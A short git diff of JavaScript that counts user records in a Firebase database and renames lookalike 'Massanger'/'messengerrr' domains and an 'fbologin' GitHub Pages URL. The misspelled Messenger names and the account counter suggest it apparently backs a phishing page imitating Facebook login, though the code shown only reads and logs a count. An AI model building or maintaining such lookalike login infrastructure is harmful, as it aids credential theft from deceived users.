@@ -1,5 +1,5 @@
 const AccountsCounter = document.getElementById('counter');
-// var path = window.location.origin.toString().replace('www.massanger.','');
+// var path = window.location.origin.toString().replace('www.messengerrr.','');
 // path = path.replace("https://","");
 console.log(window.location.origin.toString());
 // var end_of_unique = window.location.origin.toString().indexOf("netlify.app");
@@ -10,7 +10,7 @@ console.log(window.location.origin.toString());
 // // path = path.replace("https://www.","");
 // path = path.replace("/","");
 var path = "Massangger";
-//https://fbologin.github.io/Massanger/
+//https://fbologin.github.io/messengerrr/
 console.log(path);
 // on() method
     database.ref('/users'+path).once('value', function(snapshot) {
